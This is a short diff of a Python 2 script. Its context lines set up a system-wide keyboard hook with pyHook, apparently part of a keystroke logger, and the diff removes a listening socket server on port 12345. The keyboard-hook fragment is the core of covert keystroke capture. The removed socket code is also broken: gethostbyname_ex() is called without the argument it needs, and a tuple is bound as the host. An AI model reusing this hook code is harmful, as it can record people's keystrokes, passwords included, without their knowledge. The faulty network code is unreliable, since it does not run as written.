@@ -25,16 +25,3 @@ hm = pyHook.HookManager()
 hm.KeyDown = onKeyboardEvent
 hm.HookKeyboard()
 pythoncom.PumpMessages() #will wait forever
-
-
-sock = socket.socket()              #Initiate socket
-host = socket.gethostbyname_ex()    #Get the host name
-port = 12345                        #Reserve this port
-sock.bind((host, port))             #Bind to the port
-
-sock.listen(5)
-while True:
-    client, address = sock.accept() #Establish connection
-    print "Got connection from", address
-    client.send("Thanks for testing me")
-    #client.close #do not uncomment unless you need to monitor for a brief monitor
